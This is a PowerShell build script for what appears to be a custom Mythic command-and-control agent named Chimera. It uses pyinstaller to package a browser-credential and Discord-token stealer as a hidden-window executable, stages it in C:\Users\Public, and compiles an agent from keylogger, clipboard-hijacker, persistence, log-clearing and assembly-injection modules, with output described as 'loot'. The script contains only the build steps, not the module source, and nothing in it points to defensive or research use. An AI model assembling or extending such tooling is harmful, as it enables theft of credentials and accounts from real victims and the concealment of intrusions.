# build_local_test.ps1
# Builds stealer.exe then chimera_local_test.exe
# Run from: C:\projects\chimera-mythic-agent\local_test\
# Requires: Python + pyinstaller, .NET Framework 4.x (csc.exe built into Windows)
#
# Usage:
#   cd C:\projects\chimera-mythic-agent\local_test
#   powershell -ep bypass .\build_local_test.ps1

$ErrorActionPreference = "Stop"
$here = $PSScriptRoot  # always the local_test\ folder

# ─── Paths ────────────────────────────────────────────────────────────────────
$csc      = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
$agent    = Join-Path $here "..\agent_code"
$cmds     = Join-Path $agent "Commands"
$lootDir  = "C:\projects\chimera-local-test"
$stageDir = "C:\Users\Public"

# ─── Prereqs ──────────────────────────────────────────────────────────────────
if (-not (Test-Path $csc)) {
    Write-Error "csc.exe not found at $csc — .NET Framework 4.x required"
    exit 1
}

# ─── STEP 1: Build stealer.exe ────────────────────────────────────────────────
Write-Host ""
Write-Host "═══════════════════════════════════════"
Write-Host "  STEP 1: Build stealer.exe"
Write-Host "═══════════════════════════════════════"

$stealerPy = Join-Path $here "stealer.py"
if (-not (Test-Path $stealerPy)) {
    Write-Error "stealer.py not found at $stealerPy"
    exit 1
}

# Check pyinstaller
$piCheck = & python -m pyinstaller --version 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "[*] pyinstaller not found — installing..."
    & pip install pyinstaller
}

# hack-browser-data and discord_tokens must be in local_test\ alongside stealer.py
$hbd     = Join-Path $here "hack-browser-data.exe"
$discord = Join-Path $here "discord_tokens.exe"

if (-not (Test-Path $hbd)) {
    Write-Warning "hack-browser-data.exe not found in $here — stealer will fail at runtime"
}
if (-not (Test-Path $discord)) {
    Write-Warning "discord_tokens.exe not found in $here — Discord tokens step will fail"
}

# Build stealer.exe
$piArgs = @(
    "--onefile", "--noconsole",
    "--distpath", $here,
    "--workpath", (Join-Path $here "pyinstaller_build"),
    "--specpath", (Join-Path $here "pyinstaller_build")
)
if (Test-Path $hbd)     { $piArgs += @("--add-binary", "${hbd};.") }
if (Test-Path $discord) { $piArgs += @("--add-binary", "${discord};.") }
$piArgs += $stealerPy

Write-Host "[*] Running pyinstaller..."
& python -m pyinstaller @piArgs

$stealerExe = Join-Path $here "stealer.exe"
if (Test-Path $stealerExe) {
    Write-Host "[+] stealer.exe built: $stealerExe ($([int]((Get-Item $stealerExe).Length/1KB)) KB)"
} else {
    Write-Error "stealer.exe not found after build — check pyinstaller output above"
    exit 1
}

# Copy stealer.exe to staging dir so chimera_local_test can find it
New-Item -ItemType Directory -Force -Path $stageDir | Out-Null
Copy-Item $stealerExe (Join-Path $stageDir "stealer.exe") -Force
Write-Host "[+] Copied stealer.exe -> $stageDir\stealer.exe"

# ─── STEP 2: Generate LocalStubs.cs ──────────────────────────────────────────
Write-Host ""
Write-Host "═══════════════════════════════════════"
Write-Host "  STEP 2: Build chimera_local_test.exe"
Write-Host "═══════════════════════════════════════"

$stubFile = Join-Path $here "LocalStubs.cs"
@'
// Stubs — C2Http and Tasking are no-ops in local test (no Mythic server needed)
using System;
namespace Chimera {
    public static class C2Http {
        public static string Send(string json) { return "{}"; }
        public static void PostResponse(string uuid, string taskID, string output) { }
        public static string CheckIn() { return null; }
        public static string GetTasking(string uuid) { return null; }
        public static void Sleep() { System.Threading.Thread.Sleep(500); }
    }
    public static class Tasking {
        public static string CallbackUUID = "local-test-uuid";
        public static string ExtractJsonValue(string json, string key) { return null; }
    }
}
'@ | Set-Content $stubFile -Encoding UTF8
Write-Host "[+] LocalStubs.cs written"

# ─── STEP 3: Compile chimera_local_test.exe ───────────────────────────────────
$out = Join-Path $here "chimera_local_test.exe"

$sources = @(
    (Join-Path $here "LocalTest.cs"),
    (Join-Path $here "LocalConfig.cs"),
    (Join-Path $here "LocalStubs.cs"),
    (Join-Path $agent "Staging.cs"),
    (Join-Path $agent "StringHelper.cs"),
    (Join-Path $cmds "Shell.cs"),
    (Join-Path $cmds "Ls.cs"),
    (Join-Path $cmds "Pwd.cs"),
    (Join-Path $cmds "Ps.cs"),
    (Join-Path $cmds "Screenshot.cs"),
    (Join-Path $cmds "Persist.cs"),
    (Join-Path $cmds "ClearLogs.cs"),
    (Join-Path $cmds "InjectAssembly.cs"),
    (Join-Path $cmds "Upload.cs"),
    (Join-Path $cmds "Collect.cs"),
    (Join-Path $cmds "Clipper.cs"),
    (Join-Path $cmds "Keylogger.cs"),
    (Join-Path $cmds "Help.cs")
)

$cscArgs = @(
    "/target:exe",
    "/platform:x86",
    "/out:$out",
    "/r:System.Net.Http.dll",
    "/r:System.Drawing.dll",
    "/r:System.Management.dll",
    "/r:System.ServiceProcess.dll",
    "/r:System.Windows.Forms.dll"
) + $sources

Write-Host "[*] Compiling chimera_local_test.exe..."
& $csc @cscArgs

if ($LASTEXITCODE -ne 0) {
    Write-Error "Compile failed (exit $LASTEXITCODE) — check errors above"
    exit 1
}

Write-Host "[+] chimera_local_test.exe built: $out ($([int]((Get-Item $out).Length/1KB)) KB)"

# ─── STEP 4: Copy chimera_local_test.exe to staging dir ──────────────────────
Copy-Item $out (Join-Path $stageDir "chimera_local_test.exe") -Force
Write-Host "[+] Copied chimera_local_test.exe -> $stageDir\chimera_local_test.exe"

# ─── Done ─────────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "═══════════════════════════════════════"
Write-Host "  BUILD COMPLETE"
Write-Host "═══════════════════════════════════════"
Write-Host ""
Write-Host "Files in $stageDir :"
Write-Host "  stealer.exe"
Write-Host "  chimera_local_test.exe"
Write-Host ""
Write-Host "To run (open PowerShell as Admin):"
Write-Host "  cd $stageDir"
Write-Host "  .\chimera_local_test.exe"
Write-Host ""
Write-Host "Log + loot zip will appear in: $lootDir"
